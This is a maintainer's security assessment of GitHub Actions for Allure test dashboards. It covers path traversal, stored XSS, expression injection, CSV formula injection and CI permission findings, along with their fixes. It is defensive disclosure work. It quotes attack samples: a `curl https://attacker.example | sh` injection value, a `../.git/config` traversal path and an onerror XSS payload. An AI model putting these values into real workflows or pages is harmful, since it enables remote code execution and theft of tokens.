# Security Assessment: Allure Dashboard & Allure Traceability Matrix

| | |
|---|---|
| **Report revision** | 1.0 |
| **Assessment date** | 2026-10-17 |
| **Repository** | [pranesh517/allure_dashboards](https://github.com/pranesh517/allure_dashboards) |
| **Version assessed** | `v2.3.0` (commit `3d2ba0709e1c9b97d1d84ef5108adf82616021e0`) |
| **Components** | Allure Dashboard action (`action.yml`, `src/`, `site-template/`); Allure Traceability Matrix action (`traceability/`); the repository's own CI workflow |
| **Assessed by** | The maintainer, with AI-assisted code review (Claude Code). This is not an independent third-party audit. |
| **Fixed in** | Commits `41df1ce` and `a1bcd6b` (branch `fix/security-hardening`), first shipped in the release after `v2.3.0` |

---

## 1. Summary for users

**What's affected:** every release of the Allure Dashboard action from `v1.0.0` to `v2.3.0`, and every release of the Allure Traceability Matrix action from `v2.0.0` (its first release) to `v2.3.0`. That includes the floating `v1` and `v2` tags as they pointed on the assessment date.

**What to do:** upgrade to the first release after `v2.3.0`, and follow the hardening steps in [section 6](#6-recommendations-for-users). Until you upgrade:

- don't pass values from GitHub event data (branch names, PR titles, commit messages) to any of the action's inputs (SA-03), and
- only run the action on results from code you trust, especially if your Pages site is public (SA-01, SA-02, SA-04).

**Who is at risk:** every finding needs an attacker who can influence either the test results the action reads (test names, labels, error messages, attachment metadata, `categories.json`) or the inputs a workflow passes to the action. In practice, that means someone who can get code or data into your test run: a contributor, a compromised test dependency, or the application under test, whose responses end up in error messages and page-source attachments. None of the findings can be exploited by a visitor who only views your dashboard.

**No telemetry:** neither action makes any network calls or sends data anywhere. Each one reads local files and writes only to your workspace, your job summary and the site you publish. The maintainer has no access to your workflow runs, logs, secrets, metrics or Pages site. See [section 5](#5-data-handling).

---

## 2. Scope and methodology

**In scope**

- Both composite action definitions and how they pass inputs to the shell.
- The Node.js processors (`src/process.mjs`, `src/job-summary.mjs`, `traceability/src/*.mjs`): handling of untrusted result files, attachments, history and the requirements file.
- Both static report frontends (`site-template/`, `traceability/site-template/`): rendering of untrusted data into HTML.
- Generated outputs: the published site, `traceability.csv`, the job summary and step outputs.
- The repository's own workflow (`.github/workflows/test-action.yml`) and example workflows.

**Methodology**

- Manual source review of every file above, tracing each untrusted input to every point where it reaches the shell, the filesystem, HTML, Markdown or CSV output.
- Proof-of-concept verification of the High and Medium findings: crafted result files run through the real CLI, and the generated dashboard loaded in headless Chrome.
- Regression tests that fail on `v2.3.0` and pass after the fix (`test/security.test.mjs`, `traceability/test/csv-export.test.mjs`).
- Each finding checked against every release tag to determine the affected versions.

**Trust boundaries considered**

| Source | Trust |
|---|---|
| Allure result files, containers, attachments, `categories.json` | **Untrusted.** Written by test code, test frameworks, their dependencies, and data from the application under test. |
| Content of `history-path` | Semi-trusted. Restored from a cache or release that a workflow wrote. |
| Action inputs | Semi-trusted. Workflow configuration, but may be filled from GitHub event data. |
| The requirements file | Semi-trusted. Repository content. |

**Not in scope:** GitHub's own platform (Actions, Pages, the cache), the third-party actions this repository uses (beyond how they are referenced), and testing on live GitHub-hosted runners.

---

## 3. Severity ratings

| Rating | Meaning |
|---|---|
| **High** | Can expose secrets or credentials, or publish data the user never meant to publish, with no unusual configuration. |
| **Medium** | Can run attacker-controlled script or commands, but needs a specific configuration or attacker influence over test data. |
| **Low** | Limited impact, or needs the attacker to already control trusted configuration. |
| **Info** | Not a defect in this project; documented so users can make informed decisions. |

---

## 4. Findings

### Overview

| ID | Title | Severity | Component | Status |
|---|---|---|---|---|
| SA-01 | Path traversal in attachment copying publishes arbitrary runner files | High | Dashboard | Fixed |
| SA-02 | Stored cross-site scripting in the dashboard frontend | Medium | Dashboard | Fixed |
| SA-03 | Expression injection in the composite actions' run steps | Medium | Both | Fixed |
| SA-04 | HTML/SVG attachments execute in the dashboard's origin | Medium | Dashboard | Fixed |
| SA-05 | Spreadsheet formula injection in `traceability.csv` | Low | Traceability | Fixed |
| SA-06 | Repository CI grants Pages-deploy permissions to pull-request runs | Low | Repository CI | Fixed |
| SA-07 | Report footer leaks users' site URLs via Referer | Low | Both | Fixed |
| SA-08 | Regular expressions from configuration have no time limit | Low | Both | Accepted (documented) |
| SA-09 | Content of `history-path` is republished without validation | Low | Dashboard | Accepted (documented) |
| SA-10 | Nested `actions/setup-node` is referenced by tag, not commit SHA | Low | Both | Open |
| SA-11 | Newline in `output-path` can inject extra step outputs | Low | Both | Accepted |
| SA-12 | Using any third-party action means trusting its code | Info | Platform | Documented |

---

### SA-01: Path traversal in attachment copying publishes arbitrary runner files

| | |
|---|---|
| **Severity** | High |
| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| **Affected** | Dashboard `v1.0.0` – `v2.3.0` |
| **Location** | `src/process.mjs`, `resolveAttachments()` |
| **Status** | Fixed in `41df1ce` |

**Description.** Allure attachments name their file in a `source` field, which the action joined to the results directory and copied into the generated site. The value was never checked, so a result file containing `"source": "../.git/config"` caused the action to copy that file into the site. A symlink inside the results directory pointing elsewhere had the same effect.

**Impact.** Any file the runner can read could be published to the Pages site. One example is `.git/config`, where `actions/checkout` stores the job's `GITHUB_TOKEN` by default. Others are `.env` files, or credential files that earlier steps write into the workspace. On many plans, Pages sites are public even for private repositories.

**Verification.** A crafted result file was run through the CLI. The contents of a test `.git/config`, including its `AUTHORIZATION` header, appeared under `data/attachments/` in the output.

**Fix.** An attachment is now copied only if `source` is a plain file name, with no path separators, naming a regular file directly inside the results directory (checked with `lstat`, so symlinks are rejected). Anything else is treated as a missing attachment. Covered by `test/security.test.mjs`.

---

### SA-02: Stored cross-site scripting in the dashboard frontend

| | |
|---|---|
| **Severity** | Medium |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **Affected** | Dashboard `v1.0.0` – `v2.3.0` |
| **Location** | `site-template/assets/js/app.js` (suite bars, failure categories, flaky-tests table, run picker, KPI tiles, status chips), `site-template/assets/js/charts.js` (trend tooltip) |
| **Status** | Fixed in `41df1ce` |

**Description.** Most values were HTML-escaped before rendering, but suite names, category names, test names in the flaky and category panels, run labels and run ids were inserted into `innerHTML` unescaped.

**Impact.** A test name such as `<img src=x onerror=…>` ran script in the browser of everyone who viewed the dashboard. Test names often contain external data (parameterized tests), and run labels may come from workflow inputs. Project Pages sites share one origin (`<owner>.github.io`), so script running in one project's dashboard can reach the browser storage of the owner's other project sites.

**Verification.** In headless Chrome, a dashboard generated from a crafted result ran the injected script on `v2.3.0`. After the fix, the same input shows as text.

**Fix.** All of these values now go through `escapeHtml()`. The Traceability Matrix frontend was reviewed and already escaped every value.

---

### SA-03: Expression injection in the composite actions' run steps

| | |
|---|---|
| **Severity** | Medium |
| **CWE** | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| **Affected** | Dashboard `v1.0.0` – `v2.3.0`; Traceability `v2.0.0` – `v2.3.0` |
| **Location** | `action.yml` and `traceability/action.yml`, the `run:` step |
| **Status** | Fixed in `41df1ce` |

**Description.** Both actions built their shell command by splicing `${{ inputs.* }}` directly into the script text. GitHub substitutes these expressions before the shell runs, so quotes in an input value do not contain it.

**Impact.** If a workflow passed attacker-influenced data to an input (for example `run-label: ${{ github.head_ref }}`, or a PR title as `dashboard-title`), a value like `"; curl https://attacker.example | sh; "` would run as a command in the user's job, with the job's token and secrets. Even harmless values containing `"` or `$(` broke the step.

**Fix.** Every input now reaches the script only as an environment variable (`env:`), referenced as a quoted shell variable. A regression test fails if any `${{ }}` expression appears in either action's run script.

---

### SA-04: HTML/SVG attachments execute in the dashboard's origin

| | |
|---|---|
| **Severity** | Medium |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **Affected** | Dashboard `v1.0.0` – `v2.3.0` |
| **Location** | `src/process.mjs`, `resolveAttachments()`; `site-template/assets/js/app.js`, `renderAttachments()` |
| **Status** | Fixed in `41df1ce` |

**Description.** Attachments were published with their original extension, on the same origin as the dashboard, and linked directly. Page-source dumps captured on failure (`text/html`) are common in UI test suites, and they contain the application's own scripts. SVG and XML files can also carry script.

**Impact.** Opening such an attachment from the dashboard ran its scripts with the dashboard's origin. This has the same reach as SA-02.

**Fix.** Attachments with an HTML, XHTML, SVG, XML, XSL or MHTML extension or MIME type are published with an extra `.txt` extension and the type `text/plain`, so browsers display them as text. As a result, SVG screenshots appear as file links rather than thumbnails. Covered by `test/security.test.mjs`.

---

### SA-05: Spreadsheet formula injection in `traceability.csv`

| | |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-1236: Improper Neutralization of Formula Elements in a CSV File |
| **Affected** | Traceability `v2.0.0` – `v2.3.0` |
| **Location** | `traceability/src/csv-export.mjs`, `csvField()` |
| **Status** | Fixed in `a1bcd6b` |

**Description.** Text cells (test names, requirement titles, suites) were written as-is. Excel and Google Sheets run a cell that begins with `=`, `+`, `-` or `@` as a formula.

**Impact.** Anyone who opened the audit export in a spreadsheet could have a test name run a formula, for example a `HYPERLINK` that sends data to an external site when clicked.

**Fix.** Text cells starting with `=`, `+`, `-`, `@`, a tab or a carriage return are prefixed with `'`. One visible effect: a test named `-1 balance` appears as `'-1 balance` in the CSV.

---

### SA-06: Repository CI grants Pages-deploy permissions to pull-request runs

| | |
|---|---|
| **Severity** | Low (this repository only; does not affect users of the actions) |
| **CWE** | CWE-250: Execution with Unnecessary Privileges |
| **Location** | `.github/workflows/test-action.yml` |
| **Status** | Fixed in `a1bcd6b` |

**Description.** The self-test workflow granted `pages: write` and `id-token: write` to the single job that also runs for pull requests, and that job saved its checkout token.

**Fix.** The job that runs for pull requests now has only `contents: read` and uses `persist-credentials: false`. Deployment runs in a separate `deploy` job that has the Pages permissions and runs only on pushes to `main`.

---

### SA-07: Report footer leaks users' site URLs via Referer

| | |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-200: Exposure of Sensitive Information to an Unauthorized Actor |
| **Affected** | Both report templates, all versions |
| **Status** | Fixed in `a1bcd6b` |

**Description.** The footer link back to this repository used `rel="noopener"` without `noreferrer`. When a viewer clicked it, the browser sent the report's URL to GitHub, and it appeared in the maintainer's repository traffic statistics as a referring site. That URL may be a private or internal deployment.

**Fix.** The link now uses `rel="noopener noreferrer"`.

---

### SA-08: Regular expressions from configuration have no time limit

| | |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-1333: Inefficient Regular Expression Complexity |
| **Location** | Dashboard: `categories.json` `messageRegex` / `traceRegex`. Traceability: `*-id-pattern` inputs. |
| **Status** | Accepted; documented under "Known issues" in both READMEs |

**Description.** A pattern with catastrophic backtracking (for example `(a+)+$`) can make the step hang on a long message or stack trace. **Rationale for accepting:** these patterns are the user's own configuration, and JavaScript has no built-in regex timeout. Enforcing one would require a worker thread per match, adding complexity for little benefit. The impact is limited to delaying the user's own job.

---

### SA-09: Content of `history-path` is republished without validation

| | |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-345: Insufficient Verification of Data Authenticity |
| **Location** | `src/process.mjs`, carrying `runs/` and `attachments/` forward from `history-path` |
| **Status** | Accepted; documented under "Known issues" |

**Description.** Previous run snapshots and attachments found under `history-path` are copied into the new site without validation. Anyone who can write to that cache or release can control part of the published site. **Rationale for accepting:** this data is the action's own earlier output, and GitHub scopes caches by branch, so a pull request from a fork cannot write a cache that `main` restores. Users are told to restore history only from storage their own default-branch workflow wrote.

---

### SA-10: Nested `actions/setup-node` is referenced by tag, not commit SHA

| | |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **Location** | `action.yml`, `traceability/action.yml`: `uses: actions/setup-node@v4` |
| **Status** | Open |

**Description.** Both actions run `actions/setup-node@v4`, and every user inherits that reference. A user who pins this action to a commit SHA (as recommended in section 6) still gets whatever the `v4` tag points to when the job runs. **Planned fix:** pin to a full commit SHA, kept current with Dependabot.

---

### SA-11: Newline in `output-path` can inject extra step outputs

| | |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-93: Improper Neutralization of CRLF Sequences |
| **Location** | `site-path=` line written to `$GITHUB_OUTPUT` in both processors |
| **Status** | Accepted |

**Description.** A newline in the `output-path` input would add extra lines to the step's outputs. **Rationale for accepting:** `output-path` is a directory name set in the workflow file, and the same person controls the workflow anyway. No other output contains text from test data; all other outputs are numbers.

---

### SA-12: Using any third-party action means trusting its code

| | |
|---|---|
| **Severity** | Info (a property of GitHub Actions, not a defect in this project) |
| **Status** | Documented under "Known issues" in both READMEs |

**Description.** `uses: owner/action@tag` runs whatever that tag points to when the job runs, inside the user's job and with its access: checked-out code, the saved checkout token, secrets passed to the step, and anything published afterwards. If any action's repository or its maintainer's account is compromised and its tags are moved, every workflow using those tags runs the new code. This happened to `tj-actions/changed-files` in March 2025.

**What the maintainer does:** no runtime dependencies (nothing is installed from npm), a small codebase that is easy to audit, and no network calls. **What users should do:** see section 6.

---

## 5. Data handling

| Question | Answer |
|---|---|
| Does the action send data anywhere? | **No.** No network calls, analytics or telemetry. The report frontends only load their own `./data/*.json` files. |
| Can the maintainer see my runs, logs, secrets, metrics or site? | **No.** GitHub gives action authors no access to the workflows that use their action. Like everyone else, the maintainer can see only what you make public: public repositories and public Pages sites. |
| What does the action publish? | Everything in your Allure results that reaches the report: test names, parameters, step names, error messages, stack traces, labels, links, and every attachment (screenshots, page sources, logs). On GitHub Free, Pro and Team plans, Pages sites are public even for private repositories. Review what your tests record before publishing. |
| Does it need secrets or write permissions? | **No.** The action itself needs only read access to the workspace. Only the separate Pages deploy step needs `pages: write` and `id-token: write`. |
| Does it install dependencies at runtime? | **No.** It runs plain Node.js modules shipped in the repository. Its only external reference is `actions/setup-node` (see SA-10). |

---

## 6. Recommendations for users

1. **Upgrade** to the first release after `v2.3.0`.
2. **Pin to a full commit SHA**, not a tag. Dependabot (`package-ecosystem: github-actions`) can keep SHA pins up to date.
3. **Grant least privilege.** Run the action in a job with `contents: read` only, and deploy Pages from a separate job.
4. **Don't pass secrets** to the action's step or set them as job-level `env:`. The action needs none.
5. **Use `persist-credentials: false`** on `actions/checkout` unless a later step needs to push.
6. **Don't feed event data into inputs.** Avoid values like `${{ github.head_ref }}` or `${{ github.event.pull_request.title }}`. Inputs are safe since the fix, but a workflow that splices such values into its own `run:` steps is still exposed.
7. **Restore `history-path` only from storage your default branch writes**, and don't deploy Pages from pull-request runs.
8. **Review what your tests record.** Anything in a test name, parameter, step name, error message or attachment ends up on the published site.

Example of a hardened workflow:

```yaml
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<commit-sha>  # v4
        with:
          persist-credentials: false
      # ... run your tests, restore history ...
      - uses: pranesh517/allure_dashboards@<commit-sha>  # vX.Y.Z
        with:
          allure-results-path: allure-results
          history-path: dashboard-history
      - uses: actions/upload-pages-artifact@<commit-sha>  # v3
        if: github.ref == 'refs/heads/main' && github.event_name == 'push'
        with:
          path: allure-dashboard

  deploy:
    needs: test
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
    permissions:
      pages: write
      id-token: write
    environment: github-pages
    steps:
      - uses: actions/deploy-pages@<commit-sha>  # v4
```

---

## 7. Existing security controls

The following were in place before this assessment and were confirmed during review:

- **No runtime dependencies**: nothing is installed from npm on the user's runner.
- **Link filtering**: links in test data render as clickable links only if they use `http:` or `https:` (no `javascript:` or `data:` URLs), in both frontends and in the job summary.
- **Markdown escaping in the job summary**: pipes, HTML, Markdown control characters and line breaks from test data are neutralized.
- **HTML descriptions reduced to text**: `descriptionHtml` is parsed in an inert document, and only its text content is shown.
- **Prototype pollution guard**: labels are collected through a `Map`, so a label named `__proto__` stays plain data.
- **Filename sanitization**: run ids are restricted to `[A-Za-z0-9_.-]` before they become file names.
- **Traceability frontend**: every interpolated value is escaped, through a shared, unit-tested `escapeHtml()`.
- **Public-exposure warning**: the READMEs warn that everything in the report is public on Pages.

---

## 8. Limitations

- This was a source-code review by the maintainer, assisted by an AI tool. It was not a penetration test or an independent audit.
- Dynamic testing used the local CLI and headless Chrome, not live GitHub-hosted runners or a deployed Pages site.
- The CI changes in SA-06 were checked for valid syntax; the separate deploy job is exercised on the first push to `main` after the fix.
- GitHub's platform and the third-party actions referenced here were not assessed.

---

## 9. Reporting a vulnerability

Please report security issues privately through GitHub's **private vulnerability reporting** on this repository's Security tab ("Report a vulnerability"), not in a public issue.

---

## 10. Revision history

| Revision | Date | Change |
|---|---|---|
| 1.0 | 2026-10-17 | Initial assessment of `v2.3.0`. SA-01 – SA-07 fixed; SA-08, SA-09, SA-11 accepted; SA-10 open; SA-12 documented. |
